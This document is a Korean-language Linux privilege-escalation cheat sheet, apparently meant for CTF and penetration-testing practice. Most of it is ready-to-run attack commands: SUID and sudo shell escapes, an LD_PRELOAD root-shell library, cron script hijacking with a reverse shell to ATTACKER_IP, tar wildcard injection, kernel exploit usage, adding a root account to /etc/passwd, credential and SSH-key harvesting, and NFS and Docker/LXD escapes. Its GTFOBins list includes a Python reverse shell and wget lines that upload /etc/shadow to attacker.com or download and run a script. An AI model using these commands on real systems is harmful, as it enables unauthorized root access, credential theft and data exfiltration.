# Linux 권한 상승 치트시트

> 최종 업데이트: 2026-02-08
> 참고: GTFOBins, linPEAS, HackTricks 기반

---

## 목차

1. [초기 정찰](#초기-정찰)
2. [SUID/SGID 악용](#suidsgid-악용)
3. [sudo 설정 악용](#sudo-설정-악용)
4. [Cron Job 악용](#cron-job-악용)
5. [Kernel Exploit](#kernel-exploit)
6. [파일 권한 및 Capabilities 악용](#파일-권한-및-capabilities-악용)
7. [패스워드 및 자격증명 수집](#패스워드-및-자격증명-수집)
8. [NFS 악용](#nfs-악용)
9. [Docker/LXD 탈출](#dockerlxd-탈출)
10. [GTFOBins 핵심 바이너리 10개](#gtfobins-핵심-바이너리-10개)
11. [linPEAS 결과 읽는 법](#linpeas-결과-읽는-법)
12. [자동화 도구 비교](#자동화-도구-비교)

---

## 초기 정찰

### 답지: 시스템 정보 수집 명령어

```bash
# 기본 시스템 정보
hostname
uname -a                    # 커널 버전 (exploit 검색용)
cat /etc/os-release         # OS 배포판 정보
cat /proc/version           # 커널 + GCC 버전
arch                        # 아키텍처 (x86_64, aarch64 등)

# 현재 사용자 정보
id                          # UID, GID, 그룹 정보
whoami
groups                      # 소속 그룹 (docker, lxd, disk 등 중요)
sudo -l                     # sudo 실행 가능 명령 (가장 중요!)

# 다른 사용자 정보
cat /etc/passwd             # 사용자 목록
cat /etc/shadow             # 패스워드 해시 (읽을 수 있다면 대박)
cat /etc/group              # 그룹 목록

# 네트워크 정보
ip a                        # 네트워크 인터페이스
ss -tlnp                    # 열린 포트 (내부 서비스 발견)
cat /etc/hosts              # 호스트 파일
arp -a                      # ARP 테이블 (네트워크 탐색)

# 실행 중인 프로세스
ps aux                      # 모든 프로세스 (root 프로세스 주목)
ps aux | grep root          # root로 실행 중인 프로세스

# 설치된 프로그램
dpkg -l                     # Debian/Ubuntu
rpm -qa                     # CentOS/RHEL
which python python3 perl ruby gcc  # 사용 가능한 도구
```

### 해설: 왜 정찰이 중요한가

- `uname -a`로 커널 버전을 확인하면 알려진 커널 익스플로잇 검색 가능
- `sudo -l`은 **가장 빠른 권한 상승 경로**를 보여줌
- `groups`에서 `docker`, `lxd`, `disk` 그룹에 속해 있으면 즉시 root 가능
- 내부 포트에서 실행 중인 서비스가 추가 공격 벡터가 될 수 있음

---

## SUID/SGID 악용

### 답지: SUID 바이너리 찾기 및 악용

```bash
# SUID 바이너리 검색
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
find / -perm -u=s -type f 2>/dev/null     # 동일 (다른 표기법)

# SUID + SGID 모두 찾기
find / -perm /6000 -type f 2>/dev/null
```

#### SUID 악용 예시

```bash
# /usr/bin/find에 SUID가 설정된 경우
find . -exec /bin/sh -p \;
# -p 옵션: 유효 UID를 유지 (SUID로 얻은 권한 보존)

# /usr/bin/vim에 SUID가 설정된 경우
vim -c ':!/bin/sh'
# 또는
vim -c ':set shell=/bin/sh' -c ':shell'

# /usr/bin/bash에 SUID가 설정된 경우
bash -p
# -p: privileged mode (유효 UID 유지)

# /usr/bin/python3에 SUID가 설정된 경우
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# /usr/bin/cp에 SUID가 설정된 경우
# /etc/passwd를 복사하여 새 root 사용자 추가
cp /etc/passwd /tmp/passwd.bak
# openssl로 패스워드 해시 생성
openssl passwd -1 -salt hack password123
# 결과: $1$hack$WiOZg3CZzKB4QmJRnB6M5.
echo 'hacker:$1$hack$WiOZg3CZzKB4QmJRnB6M5.:0:0::/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
su hacker  # password123으로 로그인 -> root!

# /usr/bin/nmap에 SUID가 설정된 경우 (구 버전)
nmap --interactive
nmap> !sh

# /usr/bin/env에 SUID가 설정된 경우
env /bin/sh -p
```

### 해설: 왜 SUID 악용이 작동하는가

```
일반 바이너리 실행:
  User(uid=1000) -> /usr/bin/cat -> uid=1000으로 실행

SUID 바이너리 실행:
  User(uid=1000) -> /usr/bin/find (SUID, owner=root)
                  -> uid=0(root)으로 실행!
                  -> -exec로 쉘 생성 -> root 쉘!
```

SUID 비트(`-rwsr-xr-x`)가 설정된 바이너리는 **파일 소유자의 권한**으로 실행됨. 소유자가 root이고, 해당 바이너리가 쉘 명령을 실행할 수 있다면 root 쉘을 얻을 수 있음.

### 실습 포인트

- SUID 바이너리를 찾은 후 반드시 GTFOBins에서 해당 바이너리 검색
- 커스텀 바이너리(비표준 경로)에 SUID가 있으면 더 가능성이 높음
- `-p` 플래그 없이 쉘을 실행하면 SUID 권한이 드롭될 수 있음

---

## sudo 설정 악용

### 답지: sudo 악용 방법

```bash
# 현재 사용자의 sudo 권한 확인
sudo -l

# 출력 예시:
# User user1 may run the following commands on target:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (ALL) NOPASSWD: /usr/bin/find
#     (root) NOPASSWD: /usr/bin/python3
#     (ALL, !root) NOPASSWD: /bin/bash
```

#### sudo 악용 예시

```bash
# sudo vim -> root 쉘
sudo vim -c ':!/bin/bash'

# sudo find -> root 쉘
sudo find / -exec /bin/bash \; -quit

# sudo python3 -> root 쉘
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo less/more -> root 쉘
sudo less /etc/hosts
# less 내에서:
!/bin/bash

# sudo awk -> root 쉘
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo perl -> root 쉘
sudo perl -e 'exec "/bin/bash";'

# sudo ruby -> root 쉘
sudo ruby -e 'exec "/bin/bash"'

# sudo nmap -> root 쉘 (구 버전)
sudo nmap --interactive
!sh

# sudo env -> root 쉘
sudo env /bin/bash

# sudo man -> root 쉘
sudo man man
# man 내에서:
!/bin/bash

# sudo ftp -> root 쉘
sudo ftp
ftp> !/bin/bash

# sudo (ALL, !root) 우회 (CVE-2019-14287)
# sudo 1.8.28 이전 버전
sudo -u#-1 /bin/bash
# uid -1 = uid 4294967295가 되어야 하지만, 실제로는 uid 0(root)로 해석됨!

# sudo에서 LD_PRELOAD 설정 가능한 경우
# sudo -l에서 env_keep에 LD_PRELOAD가 있으면:
# shell.c:
# #include <stdio.h>
# #include <stdlib.h>
# void _init() {
#     unsetenv("LD_PRELOAD");
#     setuid(0);
#     system("/bin/bash");
# }
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_command

# sudo에서 LD_LIBRARY_PATH 설정 가능한 경우
# 타겟 바이너리가 로드하는 라이브러리를 악성 라이브러리로 교체
ldd /usr/bin/target_binary  # 의존 라이브러리 확인
# 동일한 이름의 악성 .so 파일 생성
sudo LD_LIBRARY_PATH=/tmp /usr/bin/target_binary
```

### 해설: 왜 sudo 악용이 작동하는가

- `sudo`는 지정된 명령을 **root 권한**으로 실행할 수 있게 함
- 관리자가 "vim만 허용하면 안전하겠지"라고 생각하지만, vim에서 쉘 실행 가능
- GTFOBins에 등록된 대부분의 유닉스 도구들은 쉘 이스케이프가 가능
- `NOPASSWD`가 설정되어 있으면 패스워드 없이 즉시 악용 가능

### 실습 포인트

- `sudo -l` 출력을 반드시 GTFOBins에서 교차 확인
- 환경 변수(`env_keep`)에 `LD_PRELOAD`가 있으면 거의 확실한 privesc
- sudo 버전 확인: `sudo --version` (CVE-2019-14287, CVE-2021-3156 등)

---

## Cron Job 악용

### 답지: Cron Job 찾기 및 악용

```bash
# Cron Job 목록 확인
crontab -l                     # 현재 사용자의 crontab
cat /etc/crontab               # 시스템 전체 crontab
ls -la /etc/cron.d/            # 추가 cron 설정
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /var/spool/cron/
cat /var/log/cron.log          # cron 실행 로그 (가능한 경우)

# systemd 타이머 확인
systemctl list-timers --all
```

#### Cron 악용 시나리오

```bash
# 시나리오 1: 쓰기 가능한 스크립트가 root cron으로 실행됨
# /etc/crontab 내용:
# * * * * * root /opt/scripts/backup.sh

ls -la /opt/scripts/backup.sh  # 권한 확인
# -rwxrwxrwx 1 root root ...   <-- 모든 사용자가 쓰기 가능!

# 리버스 쉘 삽입
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh

# 또는 SUID bash 생성
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# 1분 후:
/tmp/rootbash -p   # root 쉘!


# 시나리오 2: PATH 기반 악용
# /etc/crontab에 PATH가 설정되어 있고, cron 스크립트가 절대경로 없이 명령 실행
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin
# * * * * * root backup.sh

# /home/user에 backup.sh 생성 (PATH에서 먼저 검색됨)
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh


# 시나리오 3: Wildcard 악용
# cron에서 tar를 와일드카드와 함께 사용하는 경우
# * * * * * root tar czf /backup/archive.tar.gz /home/user/*

# tar의 --checkpoint 옵션을 파일명으로 악용
cd /home/user
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# tar가 와일드카드를 확장할 때 이 파일명이 옵션으로 해석됨!


# 시나리오 4: 존재하지 않는 스크립트를 cron이 실행
# * * * * * root /opt/scripts/monitor.sh
# /opt/scripts/monitor.sh가 존재하지 않고, /opt/scripts/에 쓰기 권한이 있는 경우

echo '#!/bin/bash' > /opt/scripts/monitor.sh
echo 'chmod +s /bin/bash' >> /opt/scripts/monitor.sh
chmod +x /opt/scripts/monitor.sh
```

### 해설: 왜 Cron 악용이 작동하는가

- Cron 작업은 **지정된 사용자 권한**으로 실행 (주로 root)
- 스크립트 파일의 **쓰기 권한**이 적절하지 않으면, 내용을 교체 가능
- PATH 검색 순서를 악용하여 **다른 바이너리를 먼저 실행**시킬 수 있음
- tar, rsync 등의 와일드카드 처리 방식이 파일명을 **옵션으로 해석**

### 실습 포인트

- pspy 도구로 실시간 프로세스 모니터링 (cron 작업 실행 관찰)
  ```bash
  ./pspy64  # 또는 ./pspy32
  # root가 주기적으로 실행하는 스크립트 관찰
  ```
- crontab이 비어 있어도 `/etc/cron.d/`, systemd 타이머 확인 필수

---

## Kernel Exploit

### 답지: 커널 익스플로잇 검색 및 실행

```bash
# 커널 버전 확인
uname -r               # 예: 5.4.0-42-generic
cat /proc/version       # 상세 정보

# 유명 커널 익스플로잇 목록
# Dirty COW (CVE-2016-5195) - Linux 2.6.22 ~ 4.8.3
# Dirty Pipe (CVE-2022-0847) - Linux 5.8 ~ 5.16.11
# GameOver(lay) (CVE-2023-2640, CVE-2023-32629) - Ubuntu OverlayFS
# StackRot (CVE-2023-3269) - Linux 6.1 ~ 6.4
# nf_tables (CVE-2024-1086) - Linux 5.14 ~ 6.6

# 자동 익스플로잇 검색
# linux-exploit-suggester
./linux-exploit-suggester.sh
# 또는
perl ./linux-exploit-suggester-2.pl

# searchsploit으로 검색
searchsploit linux kernel 5.4 privilege escalation
searchsploit --examine 12345  # 익스플로잇 상세 보기
```

#### Dirty Pipe (CVE-2022-0847) 예시

```bash
# 영향 범위: Linux 5.8 ~ 5.16.11, 5.15.25, 5.10.102
uname -r  # 버전 확인

# 컴파일 (타겟 또는 동일 아키텍처에서)
gcc -o dirtypipe exploit.c
./dirtypipe /etc/passwd 1 "${OVERWRITE_DATA}"

# 또는 SUID 바이너리를 통한 악용
./dirtypipe /usr/bin/su 1 "${SHELLCODE}"
```

#### nf_tables (CVE-2024-1086) 예시

```bash
# 영향 범위: Linux 5.14 ~ 6.6 (다수의 배포판 기본 커널)
# 매우 안정적인 exploit으로 알려짐

git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
./exploit
# id -> uid=0(root)
```

### 해설: 왜 커널 익스플로잇이 작동하는가

- 커널은 **최고 권한(ring 0)**으로 실행됨
- 커널의 메모리 관리, 파일 시스템, 네트워크 스택 등에서 버그가 발생하면, 사용자 공간에서 커널 메모리를 조작하여 **임의 코드 실행** 가능
- Dirty Pipe: 파이프 버퍼의 플래그 초기화 미비로 **임의 파일 덮어쓰기** 가능
- Dirty COW: Copy-On-Write 레이스 컨디션으로 읽기 전용 파일을 **쓰기** 가능

### 실습 포인트

- 커널 익스플로잇은 **시스템 크래시 위험**이 있으므로 CTF/랩 환경에서만 사용
- 먼저 다른 방법(sudo, SUID, cron)을 시도하고, 최후 수단으로 커널 익스플로잇
- 익스플로잇 컴파일 시 타겟과 동일한 아키텍처/커널 버전에서 컴파일할 것

---

## 파일 권한 및 Capabilities 악용

### 답지: Capabilities 악용

```bash
# Capability가 설정된 파일 찾기
getcap -r / 2>/dev/null

# 주요 악용 가능 Capabilities
# cap_setuid+ep -> UID를 0(root)으로 변경 가능
# cap_dac_override+ep -> 모든 파일 읽기/쓰기 가능
# cap_dac_read_search+ep -> 모든 파일 읽기 가능
# cap_net_raw+ep -> Raw 소켓 사용 가능
# cap_sys_admin+ep -> 거의 root 수준
```

#### Capability 악용 예시

```bash
# python3에 cap_setuid+ep가 설정된 경우
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl에 cap_setuid+ep가 설정된 경우
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# ruby에 cap_setuid+ep가 설정된 경우
/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# vim에 cap_dac_override가 설정된 경우
# /etc/shadow 읽기 가능! -> 해시 크래킹
vim /etc/shadow
```

### 답지: 쓰기 가능한 민감 파일

```bash
# 쓰기 가능한 파일 검색
find / -writable -type f 2>/dev/null | grep -v proc

# 핵심 타겟 파일
/etc/passwd           # 사용자 추가 가능 (root 권한 사용자)
/etc/shadow           # 패스워드 해시 변경 가능
/etc/sudoers          # sudo 권한 추가 가능
/etc/crontab          # cron 작업 추가 가능
/root/.ssh/authorized_keys  # SSH 키 추가 가능

# /etc/passwd가 쓰기 가능한 경우
# 방법 1: root의 패스워드 해시를 빈 값으로 변경
# root:x:0:0:... -> root::0:0:...
# su root (패스워드 없이 로그인)

# 방법 2: 새로운 root 사용자 추가
openssl passwd -1 -salt abc password123
# 결과: $1$abc$...
echo 'newroot:$1$abc$nsOreosnLReeK2rMp4JLE.:0:0::/root:/bin/bash' >> /etc/passwd
su newroot  # password123으로 로그인
```

### 해설: 왜 Capabilities 악용이 작동하는가

- Capabilities는 root 권한을 **세분화**한 것이지만, `cap_setuid`만으로도 root가 될 수 있음
- SUID보다 덜 눈에 띄지만 동일하게 위험
- `getcap`으로 찾지 않으면 놓치기 쉬움 (linPEAS가 자동 탐지)

---

## 패스워드 및 자격증명 수집

### 답지: 자격증명 검색

```bash
# 히스토리 파일에서 패스워드 검색
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# 설정 파일에서 패스워드 검색
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret\|key\|token" /var/www/ 2>/dev/null
grep -ri "password" /home/ 2>/dev/null

# 특정 설정 파일
cat /var/www/html/wp-config.php      # WordPress
cat /var/www/html/configuration.php   # Joomla
cat /var/www/html/.env                # Laravel/Node.js
cat /etc/mysql/my.cnf                 # MySQL
cat /etc/postgresql/*/main/pg_hba.conf # PostgreSQL

# SSH 키
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# 패스워드 해시 크래킹
# /etc/shadow 읽기 가능한 경우
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512

# 패스워드 재사용 테스트
# DB 패스워드나 설정 파일의 패스워드로 root 로그인 시도
su root  # 발견된 패스워드 입력
ssh root@localhost  # 발견된 패스워드 입력
```

### 해설: 왜 자격증명 수집이 효과적인가

- 개발자가 **패스워드를 설정 파일에 평문으로 저장**하는 경우가 많음
- **패스워드 재사용**: DB 패스워드가 시스템 패스워드와 동일한 경우
- 히스토리 파일에 `mysql -u root -p'password123'` 같은 명령이 남아있는 경우

---

## NFS 악용

### 답지: NFS no_root_squash 악용

```bash
# NFS 설정 확인
cat /etc/exports
# 예: /home/backup *(rw,no_root_squash)
# no_root_squash = 원격 root가 로컬 root 권한을 유지!

showmount -e TARGET_IP  # 공유 디렉토리 확인

# 공격자 머신에서:
mkdir /tmp/nfs
mount -o rw TARGET_IP:/home/backup /tmp/nfs

# SUID 쉘 생성
cat > /tmp/nfs/shell.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# 타겟에서:
/home/backup/shell   # root 쉘!
```

### 해설: 왜 NFS 악용이 작동하는가

- `no_root_squash` 옵션은 원격 root 사용자를 **로컬 root로 매핑**
- 공격자 머신에서 root로 SUID 파일을 생성하면, 타겟에서도 SUID로 실행됨
- 정상적으로는 `root_squash` 설정으로 원격 root를 nobody로 매핑해야 함

---

## Docker/LXD 탈출

### 답지: 컨테이너 탈출

```bash
# Docker 그룹에 속해 있는 경우
id  # groups에 docker 포함 확인

# 호스트 파일시스템 마운트
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# 또는
docker run -v /:/host --rm -it ubuntu bash
cat /host/etc/shadow   # 호스트의 shadow 파일 접근!

# Docker 소켓 접근 가능한 경우
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

# LXD/LXC 그룹에 속해 있는 경우
# 이미지 빌드 (공격자 머신)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && ./build-alpine

# 타겟으로 전송 후:
lxc image import ./alpine-v3.x-x86_64.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# 컨테이너 내에서:
cat /mnt/root/etc/shadow  # 호스트 파일시스템 접근!
```

### 해설: 왜 Docker/LXD 탈출이 작동하는가

- Docker 그룹에 속한 사용자는 **Docker 데몬에 명령을 보낼 수 있음**
- Docker는 root로 실행되므로, 호스트 파일시스템을 마운트하면 **호스트 root 접근** 가능
- 이것은 사실상 `sudo` 없는 root 접근과 동일

---

## GTFOBins 핵심 바이너리 10개

> https://gtfobins.github.io/ 에서 전체 목록 확인 가능

### 답지: 가장 자주 악용되는 바이너리

```bash
# 1. python/python3 (가장 범용적)
# SUID: python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# sudo: sudo python3 -c 'import os; os.system("/bin/bash")'
# Capability: (cap_setuid) python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# 리버스쉘: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 2. find
# SUID: find . -exec /bin/sh -p \; -quit
# sudo: sudo find / -exec /bin/bash \; -quit
# 파일 읽기: find /etc/shadow -exec cat {} \;

# 3. vim/vi
# sudo: sudo vim -c ':!/bin/bash'
# SUID: vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'
# 파일 쓰기: 어떤 파일이든 편집 가능

# 4. nmap
# sudo (구 버전): sudo nmap --interactive -> !sh
# sudo (신 버전): echo 'os.execute("/bin/bash")' > /tmp/nmap.nse && sudo nmap --script=/tmp/nmap.nse

# 5. less/more
# sudo: sudo less /etc/hosts -> !/bin/bash
# SUID: less /etc/hosts -> !/bin/sh -p

# 6. awk/gawk
# sudo: sudo awk 'BEGIN {system("/bin/bash")}'
# SUID: awk 'BEGIN {system("/bin/sh -p")}'

# 7. bash
# SUID: bash -p
# sudo: sudo bash

# 8. tar
# sudo: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
# SUID: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh -p"
# 파일 읽기: tar xf /etc/shadow -I '/bin/sh -c "cat 1>&2"'

# 9. perl
# sudo: sudo perl -e 'exec "/bin/bash";'
# SUID: perl -e 'exec "/bin/sh -p";'
# Capability: perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# 10. wget
# 파일 덮어쓰기 (sudo): sudo wget http://attacker.com/malicious_passwd -O /etc/passwd
# 파일 업로드: wget --post-file=/etc/shadow http://attacker.com/receive
# 리버스쉘 다운로드: sudo wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
```

### 해설: GTFOBins 활용 전략

1. `sudo -l` 또는 SUID 검색 결과에서 바이너리 이름 확인
2. https://gtfobins.github.io/ 에서 해당 바이너리 검색
3. Shell, File read, File write, SUID, Sudo 중 해당하는 섹션 확인
4. 페이로드 복사하여 실행

---

## linPEAS 결과 읽는 법

### 답지: linPEAS 실행 및 분석

```bash
# 다운로드 및 실행
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt  # 결과를 파일로도 저장

# 또는 메모리에서 직접 실행 (파일을 남기지 않음)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### 색상 코드 해석

```
 빨강/노랑 (RED/YELLOW):  99% 확실한 권한 상승 벡터
    -> 즉시 확인하고 악용 시도!

 빨강 (RED): 의심스러운 설정 (높은 가능성)
    -> 반드시 수동 확인

 노랑 (YELLOW): 잠재적 권한 상승 기회
    -> 추가 조사 필요

 초록 (GREEN): 일반 정보
    -> 참고용

 파랑 (BLUE): 일반 정보 (덜 중요)
    -> 맥락 파악용
```

### linPEAS 출력 섹션별 분석 가이드

```
┌─────────────────────────────────────────────────────────┐
│ Section: System Information                              │
│ 확인 포인트:                                             │
│ - 커널 버전 -> Kernel exploit 검색                       │
│ - 배포판 버전 -> 알려진 취약점 검색                      │
│ - sudo 버전 -> CVE-2021-3156 (Baron Samedit) 등         │
│ - PATH 설정 -> 사용자가 쓸 수 있는 디렉토리가 PATH에?   │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Sudo/SUID/Capabilities                          │
│ 확인 포인트:                                             │
│ - sudo -l 결과 -> GTFOBins 교차 확인                     │
│ - SUID 바이너리 목록 -> 커스텀 바이너리 주목             │
│ - Capabilities -> cap_setuid, cap_dac_override 주목      │
│                                                          │
│ 빨강/노랑 표시된 항목이 있으면 최우선 확인!              │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Interesting Files                               │
│ 확인 포인트:                                             │
│ - 쓰기 가능한 파일 (/etc/passwd, /etc/crontab 등)       │
│ - 숨겨진 파일 (.password, .secret, .env)                │
│ - 백업 파일 (.bak, .old, .swp)                          │
│ - SSH 키 (id_rsa, authorized_keys)                      │
│ - 히스토리 파일에 패스워드                                │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Processes/Cron/Services/Timers                   │
│ 확인 포인트:                                             │
│ - root로 실행 중인 프로세스                               │
│ - cron 작업 (쓰기 가능한 스크립트?)                      │
│ - systemd 타이머                                         │
│ - 내부 포트에서 실행 중인 서비스 (127.0.0.1:8080 등)     │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Network                                         │
│ 확인 포인트:                                             │
│ - 내부 서비스 (ss -tlnp 결과)                            │
│ - ARP 테이블 (다른 호스트)                               │
│ - 네트워크 인터페이스 (피봇 포인트)                      │
└─────────────────────────────────────────────────────────┘
        ▼
┌─────────────────────────────────────────────────────────┐
│ Section: Users/Groups                                    │
│ 확인 포인트:                                             │
│ - docker, lxd 그룹 -> 컨테이너 탈출                     │
│ - disk 그룹 -> 디스크 직접 접근 가능                     │
│ - adm 그룹 -> 로그 파일 접근 가능                        │
│ - 다른 사용자의 홈 디렉토리 접근 가능 여부               │
└─────────────────────────────────────────────────────────┘
```

### linPEAS 결과 우선순위 분석 전략

```
1순위: RED/YELLOW 표시된 모든 항목
  -> 즉시 GTFOBins/검색으로 악용 방법 확인

2순위: sudo -l 결과
  -> NOPASSWD + GTFOBins 바이너리 = 즉시 root

3순위: SUID/Capabilities
  -> 비표준 바이너리에 주목

4순위: Cron Jobs + 쓰기 가능한 스크립트
  -> 시간 기다려야 하지만 안정적

5순위: 자격증명 발견
  -> 패스워드 재사용으로 su root 시도

6순위: Kernel Exploit
  -> 최후의 수단 (불안정할 수 있음)
```

### 2025 업데이트 사항

```
linPEAS 최근 추가된 탐지 항목:
- sudo restic --password-command 헬퍼를 통한 권한 상승
- IGEL OS 어플라이언스의 SUID setup/date 헬퍼 악용
- 최신 커널 CVE 자동 매칭 (CVE-2024-1086 등)
```

---

## 자동화 도구 비교

| 도구 | 용도 | 장점 | 단점 |
|------|------|------|------|
| linPEAS | 종합 열거 | 가장 포괄적, 색상 코딩 | 출력이 매우 많음 |
| LinEnum | 기본 열거 | 가볍고 빠름 | linPEAS보다 덜 상세 |
| linux-exploit-suggester | 커널 익스플로잇 검색 | 정확한 CVE 매칭 | 커널만 검사 |
| pspy | 프로세스 모니터링 | cron 작업 실시간 관찰 | 지속 실행 필요 |
| GTFONow | 자동 privesc | SUID/sudo 자동 악용 시도 | 2025 신규 도구 |

---

## 실전 체크리스트

```
[ ] sudo -l 확인
[ ] SUID/SGID 바이너리 검색
[ ] Capabilities 확인 (getcap -r /)
[ ] Cron 작업 확인 (/etc/crontab, /etc/cron.d/)
[ ] 쓰기 가능한 민감 파일 확인
[ ] 패스워드/자격증명 검색 (설정 파일, 히스토리)
[ ] 커널 버전 확인 및 CVE 검색
[ ] 실행 중인 프로세스 확인 (root 서비스)
[ ] 내부 네트워크 서비스 확인 (ss -tlnp)
[ ] 그룹 멤버십 확인 (docker, lxd, disk)
[ ] NFS 설정 확인 (/etc/exports)
[ ] SSH 키 검색
[ ] linPEAS 실행 (위 항목을 자동으로 전부 확인)
```

---

## 참고 자료

- [GTFOBins](https://gtfobins.github.io/)
- [linPEAS (PEASS-ng)](https://github.com/peass-ng/PEASS-ng)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Linux Privilege Escalation Techniques - Pentest Everything](https://viperone.gitbook.io/pentest-everything/everything/everything-linux/linux-privilege-escalation-techniques)
- [GTFONow - Auto PrivEsc](https://github.com/Frissi0n/GTFONow)
- [Linux PrivEsc Cheatsheet (GitHub)](https://github.com/frizb/Linux-Privilege-Escalation)
